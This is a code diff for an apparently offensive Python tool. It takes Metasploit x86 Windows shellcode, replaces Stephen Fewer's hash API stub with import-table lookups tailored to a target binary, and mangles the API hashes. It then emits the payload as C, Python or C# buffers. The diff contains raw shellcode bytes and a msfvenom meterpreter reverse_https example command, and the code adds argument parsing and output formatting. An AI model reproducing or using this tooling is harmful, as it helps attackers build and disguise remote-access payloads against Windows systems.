@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-# Capstone Python bindings, by Nguyen Anh Quynnh <aquynh@gmail.com>
 from __future__ import print_function
+from collections import OrderedDict
 from capstone import *
 from capstone.x86 import *
 import struct
@@ -10,25 +10,66 @@ import sys
 import re
 import random
 import string
-#from build_code import build_code
-from collections import OrderedDict
+import argparse
 import binascii
+import signal
 
 
-#from xprint import to_hex, to_x, to_x_32
-
-#testcode = 
-#testcode = open(sys.argv[1], 'rb').read()
-#print("Len stdin:", len(testcode))
   
 
 # ## Test class Cs
+
+def signal_handler(signal, frame):
+        print('\nProgram Exit')
+        sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+parser = argparse.ArgumentParser()
+parser.add_argument('infile', nargs='?', type=argparse.FileType('r'),
+                     default=sys.stdin)
+parser.add_argument("-b", "--targetBinary", default="", dest="FILE", 
+                  action="store", 
+                  help="Binary that shellcode will be customized to (Optional)"
+                  )
+parser.add_argument("-t", "--OSTarget", default="Win7", dest="OS",
+                  action="store",
+                  help="OS target for looking for target DLL Import Tables")
+parser.add_argument("-s", '--shellcode', default="", dest="code",
+                  action="store",
+                  help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
+parser.add_argument("-d", '--DLLName', default="", dest="dll", action="store",
+                  help="If you know the DLL you are targeting enter this, no need for OS, DLL flags")
+parser.add_argument('-m', '--mangle', default=False, dest="mangle",
+                  action="store_true", 
+                  help="Mangle metasploit hash apis from their original values (you want to do this)")
+parser.add_argument('outfile', nargs='?', type=argparse.FileType('w'),
+                    default=sys.stdout,
+                    )                          
+parser.add_argument('-o', '--output', dest="OUTPUT", action="store", default='stdout', 
+                    help="How you would like your output: [c], [p]ython, c[s]harp"
+                    )
+                    
+args = parser.parse_args()
+
+#print("DEBUG ARGS:", args, args.infile.buffer.seekable())
+if args.infile.buffer.seekable() is False:
+    # READ from stdin because content is there
+    args.code = args.infile.buffer.read()
+
+if not args.code:
+    print('[!] -s is required either from cmd line flag or stdin <cat code.bin> | {0}'.format(sys.argv[0]))
+    parser.print_help()
+    sys.exit()        
+
 class x86_windows_metasploit:
+    
     '''
     Inputs:
         Any metasploit source windows x86 shellcode/payload that 
         employs Stephen Fewers hash api STUB.
-         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
+         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | 
+         ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
          optional targetbinary = by default it will assume LoadLibraryA and GetProcAddress is in the target Import Address Table (IAT). If 
             the target binary is provided it will look at the imported DLLs from the windows OS to determine if their IATs contain 
             LLA/GPA or just GPA and use that.
@@ -41,15 +82,12 @@ class x86_windows_metasploit:
         A payload tailored to that binary - in c, csharp, binary, bin file outputs.
 
     '''
-    
-    def __init__(self, code, mangle=False):
-        if mangle == 'True': 
-            mangle = True
+
+    def __init__(self, **kwargs):
+        self.__dict__.update(kwargs)
         self.tracker = []
-        self.code = code
         self.arch = CS_ARCH_X86
         self.mode = CS_MODE_32
-        self.mangle =  mangle
         self.comment = "X86 32 (Intel syntax)"
         self.syntax = 0
         self.api_hashes = {}
@@ -57,6 +95,9 @@ class x86_windows_metasploit:
         self.string_table = ''
         self.tracker_dict = {}
         self.block_order = []
+        if self.OUTPUT == 'stdout':
+            # suppress print
+            self.VERBOSE = False
         
         # Length 136
         self.fewerapistub = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
@@ -78,7 +119,6 @@ class x86_windows_metasploit:
                    "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
                    "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
                    "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
-                   #"\x8b\xc3"                      # mov eax, ebx                         ;Set eax to imagebase
                    "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
                    "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
                    "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset
@@ -132,9 +172,6 @@ class x86_windows_metasploit:
                    "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
                    "\x03\xd5"                      # add edx, ebp                          ;In memory offset of API thunk
                    "\x83\xc4\x08"                  # add ESP, 8                            ;Move stack to import base addr
-                   #"\x5d"                          # pop ebp                              ;remove loadlibrary from stack
-                   #"\x5d"                          # pop ebp                              ;...
-                   #"\x33\xed"                      # xor ebp, ebp                         ;
                    "\x5f"                          # pop edi                               ;restore import base addr for parsing
                    "\x52"                          # push edx                              ;save LoadLibraryA thunk address on stack
                    "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
@@ -249,6 +286,40 @@ class x86_windows_metasploit:
                 print(hex(key),value)
                 self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
 
+    def print_formats(self):
+        '''
+        Format the output
+        '''
+        if self.OUTPUT == 'p':
+            # python output
+            count = 0 
+            print("buf = ''")
+            while count < len(self.entire_payload):
+                tmp=''
+                print("buf += \"", end="")
+                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"\n")
+                count += 13
+
+        elif self.OUTPUT == 'c':
+            # c output
+            count = 0 
+            print("unsigned char buf[] =", end='')
+            while count < len(self.entire_payload):
+                print("\n\"", end="")
+                print(''.join('\\x{:02x}'.format(x) for x in self.entire_payload[count:count+13]), end="\"")
+                count += 13
+            print(";")
+ 
+        elif self.OUTPUT == 's':
+            #csharp output
+            count = 0 
+            print("byte[] buf =new byte[{0}] {{".format(len(self.entire_payload)), end='')
+            while count < len(self.entire_payload):
+                print("\n", end="")
+                print(''.join('0x{:02x},'.format(x) for x in self.entire_payload[count:count+13]), end="")
+                count += 13
+            print("};")
+        
     def block_tracker(self):
         '''
         This is really for finding APIs....
@@ -618,19 +689,20 @@ class x86_windows_metasploit:
         self.entire_payload = self.jump_stub + self.IAT_payload + self.stub + self.prestine_code
 
         
-        print("Output payload:", binascii.hexlify(self.entire_payload), len(self.entire_payload))
+        if self.OUTPUT is 'stdout':
+            sys.stdout.buffer.write(self.entire_payload)
+        else:
+            self.print_formats()
+            #print("Output payload:", binascii.hexlify(self.entire_payload), len(self.entire_payload))
         with open('testing-out.bin', 'wb') as f:
             f.write(self.entire_payload)
-        print("EXIT")
+        sys.stderr.write("EXIT")
         
         sys.exit()
 
         
 if __name__ == '__main__':
-    #print(sys.stdin.buffer.read())
-    incoming_payload = sys.stdin.buffer.read()
-    print("Submitted payload length:", len(incoming_payload))
-    test = x86_windows_metasploit(incoming_payload, sys.argv[1])
+    test = x86_windows_metasploit(**vars(args))
     test.get_it_order()
     test.doit()
 
